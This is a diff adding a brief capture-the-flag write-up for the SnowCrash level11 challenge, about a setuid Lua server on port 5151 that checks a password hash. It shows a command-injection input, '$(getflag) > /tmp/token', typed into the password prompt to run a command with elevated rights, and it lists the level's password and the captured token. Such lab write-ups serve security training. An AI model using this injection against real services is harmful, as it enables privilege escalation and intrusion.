@@ -1,2 +1,29 @@
 su level11
 pass : woupa2yuojeeaaed06riuj63c
+
+-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
+-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
+-r-x------  1 level11 level11  675 Apr  3  2012 .profile
+
+when we cat the programme, we see that :
+the program creates a server on port 5151, 
+waits for a password and returns a response after comparison with a hash
+
+example:
+level11@SnowCrash:~$ nc localhost 5151
+Password: plop
+Erf nope..
+
+we tried to reverse the pass word in code with https://sha1.gromweb.com/
+=> NotSoEasy
+=> doesn't work
+
+when we execute the file, we have flag11 rights, 
+so we use execution to directly launch the getflag and copy the output to a file
+
+level11@SnowCrash:~$ nc localhost 5151
+Password: $(getflag) > /tmp/token
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/token
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
